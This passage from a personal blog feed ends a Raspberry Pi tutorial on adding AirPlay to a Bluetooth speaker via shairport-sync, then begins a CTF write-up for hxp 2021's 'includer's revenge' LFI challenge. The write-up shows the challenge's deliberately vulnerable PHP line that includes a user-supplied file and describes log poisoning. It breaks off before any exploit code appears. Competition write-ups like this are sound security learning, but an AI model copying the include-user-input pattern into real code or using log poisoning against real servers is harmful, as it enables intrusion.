            <content type="html">&amp;lt;p&amp;gt;In &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&amp;#x2F;&amp;quot;&amp;gt;part 1&amp;lt;&amp;#x2F;a&amp;gt; I wrote on how to create a smart speaker supporting Spotify Connect using a Raspberry Pi and a Bluetooth speaker. Since writing that post I started using Apple Music and wanted to enjoy simultaneous streaming of music to multiple speakers in my house. I wanted my bathroom speaker, which became smart by supporting Spotify Connect, to also be able to play Apple Music.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Apple Music casting uses &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.apple.com&amp;#x2F;airplay&amp;#x2F;&amp;quot;&amp;gt;AirPlay&amp;lt;&amp;#x2F;a&amp;gt; for casting audio between devices. It can be used to cast any sound from Apple devices, even when using Spotify, watching YouTube or having a phone call.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In order to add this capability to your smart speaker from the previous post - we’re going to use &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync&amp;quot;&amp;gt;shairport-sync&amp;lt;&amp;#x2F;a&amp;gt;, which is an open-source audio player supporting AirPlay 1 (and AirPlay 2 partially, at the time of writing this post). The instructions in this post are partially based on &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync&amp;#x2F;issues&amp;#x2F;200#issuecomment-520574102&amp;quot;&amp;gt;this GitHub comment by &amp;lt;code&amp;gt;bedrin&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;steps&amp;quot;&amp;gt;Steps&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-shairport-sync&amp;quot;&amp;gt;Installing shairport-sync&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Execute the following commands from to install the most recent version of shairport-sync:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get update
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get install build-essential git xmltoman autoconf automake libtool libpopt-dev libconfig-dev libasound2-dev avahi-daemon libavahi-client-dev libssl-dev libsoxr-dev
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync.git
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; shairport-sync
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;autoreconf -fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.&amp;#x2F;configure --sysconfdir&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;&amp;#x2F;etc --with-alsa --with-soxr --with-avahi --with-ssl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;openssl --with-systemd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo make install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;giving-shairport-sync-bluetooth-permissions&amp;quot;&amp;gt;Giving shairport-sync Bluetooth Permissions&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;shairport-sync needs permissions to play sound over Bluetooth. Run these commands to add shairport-sync’s user (and &amp;lt;code&amp;gt;pi&amp;lt;&amp;#x2F;code&amp;gt; for testing purposes) to the Bluetooth UNIX group which will permit it to play audio:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo adduser pi bluetooth
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo adduser shairport-sync bluetooth
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;adding-additional-alsa-device&amp;quot;&amp;gt;Adding Additional ALSA Device&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;In the previous post we edited &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; to point to the Bluetooth speaker as the default device. shairport-sync requires a named device, so we’ll create another ALSA device alongside the default one to also map to the Bluetooth speaker.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Open &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; and copy the MAC address you filled after &amp;lt;code&amp;gt;defaults.bluealsa.device&amp;lt;&amp;#x2F;code&amp;gt; (should be at line 4 in quotation marks). Replace the content of &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following, while replacing &amp;lt;code&amp;gt;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the MAC address you found in line 4:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;pcm.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ctl.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.interface &amp;amp;quot;hci0&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;pcm.bathroom_bt {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; type plug
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  slave {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    pcm {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      type bluealsa
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  hint {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    show on
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    description &amp;amp;quot;Bathroom BT&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In the above configuration I named this device &amp;quot;bathroom_bt&amp;quot; (line 7) with the description &amp;quot;Bathroom BT&amp;quot;. You can replace this to fit your scenario, but make sure to replace it in the below shairport-sync configuration as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;shairport-sync-configuration&amp;quot;&amp;gt;shairport-sync Configuration&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Now that the ALSA device is configured - we should configure shairport-sync to use this device as the sound output device. Replace the content of &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;shairport-sync.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;general =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	name = &amp;amp;quot;Bathroom Speaker&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sessioncontrol =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	allow_session_interruption = &amp;amp;quot;yes&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;alsa =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	output_device = &amp;amp;quot;bathroom_bt&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The &amp;lt;code&amp;gt;name&amp;lt;&amp;#x2F;code&amp;gt; parameter under &amp;lt;code&amp;gt;general&amp;lt;&amp;#x2F;code&amp;gt; (line 3) will be the displayed AirPlay name, set it to a suitable value. If you changed the name of the ALSA device (in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; at line 7) change it under &amp;lt;code&amp;gt;output_device&amp;lt;&amp;#x2F;code&amp;gt; at line 13 as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;disable-wifi-power-management&amp;quot;&amp;gt;Disable WiFi Power Management&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Raspberry Pi’s WiFi can sometimes goes into power-saving mode, which can cause audio drops and glitches when acting as an AirPlay server. We can disable the WiFi power management by editing &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;rc.local&amp;lt;&amp;#x2F;code&amp;gt; and adding the following line right before &amp;lt;code&amp;gt;exit 0&amp;lt;&amp;#x2F;code&amp;gt; (if you followed my previous post - this should be at line 19):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;iwconfig wlan0 power off
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After adding this line, your &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;rc.local&amp;lt;&amp;#x2F;code&amp;gt; should look like this:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh -e
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# rc.local
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# This script is executed at the end of each multiuser runlevel.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Make sure that the script will &amp;amp;quot;exit 0&amp;amp;quot; on success or any other
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# value on error.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# In order to enable or disable this script just change the execution
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# bits.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# By default this script does nothing.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Print the IP address
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;$(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hostname -I&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;[ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;$&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;printf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;My IP address is %s\n&amp;amp;quot; &amp;amp;quot;$&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;iwconfig wlan0 power off
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;exit&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; 0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;enable-shairport-sync-service&amp;quot;&amp;gt;Enable shairport-sync Service&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Finalize your setup by enabling the &amp;lt;code&amp;gt;shairport-sync&amp;lt;&amp;#x2F;code&amp;gt; service and performing a system reboot to load all the new configurations:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo systemctl enable shairport-sync
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo reboot
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
</content>
        </entry>
        
    
        
        <entry>
            <title>Winning the Impossible Race - An Unintended Solution for Includer&#x27;s Revenge &#x2F; Counter (hxp 2021)</title>
            <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&#x2F;"/>
            <updated>2021-12-27T00:00:00+0000</updated>
            <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-12-27-winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&#x2F;</id>
            <content type="html">&amp;lt;p&amp;gt;In December 2021 Eyal Daniel and me (Guy Lewin) participated in &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;2021.ctf.link&amp;#x2F;&amp;quot;&amp;gt;hxp CTF 2021&amp;lt;&amp;#x2F;a&amp;gt; on behalf of &amp;quot;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;ctftime.org&amp;#x2F;team&amp;#x2F;6965&amp;quot;&amp;gt;pasten&amp;lt;&amp;#x2F;a&amp;gt;&amp;quot; group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-challenges&amp;quot;&amp;gt;The Challenges&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;The recent hxp CTF brought us some great challenges, 2 of those challenges were &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt; - hard and medium web-challenges respectively.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;While trying to solve &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; we managed to find an awesome and incredibly hard to exploit solution that was also working on the second challenge (&amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;). Both of these challenges are based on the &amp;lt;code&amp;gt;LFI (Local File Inclusion)&amp;lt;&amp;#x2F;code&amp;gt; concept, like familiar challenges from previous years. &amp;lt;code&amp;gt;LFI&amp;lt;&amp;#x2F;code&amp;gt; is a highly documented and known category of vulnerabilities and this year’s challenges are making it a bit harder to exploit than usual.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;includer-s-revenge&amp;quot;&amp;gt;includer’s revenge&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;&amp;amp;lt;?php &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;action&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;read&amp;amp;#39; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;read&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; ? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;readfile&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;file&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;index.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) : &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;include_once&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;($_GET[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;file&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;] ?? &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;index.php&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;);
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;A very basic PHP endpoint that either reads a file, or includes it. The typical challenge is creating a local file on the server that contains a malicious PHP code. There are many documented methods to do this, the most naive one is simply using an existing upload mechanism in the targeted website. Given the simplicity of this challenge (the above code is the entire logic behind the target server) - we need a different kind of approach.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;environment-caches-sessions-and-what-not&amp;quot;&amp;gt;Environment, Caches, Sessions and What Not&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;This kind of approach takes advantage of dynamically generated files that are created in various ways using different features and situations in the underlying framework and environment. For example - inserting a log record to a running application’s log file might actually make the log file a valid PHP page! Imagine browsing to &amp;lt;code&amp;gt;&amp;#x2F;&amp;amp;lt;?php ... ?&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;, suddenly - the Nginx log file can be included and trigger logic controlled by the attacker.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-hardened-setup&amp;quot;&amp;gt;The Hardened Setup&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;On top of the source code - we are also given the &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; for creating a local instance of the challenge. Below is the &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; used in &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt;, the difference between it and &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;‘s is irrelevant for our exploit.&amp;lt;&amp;#x2F;p&amp;gt;
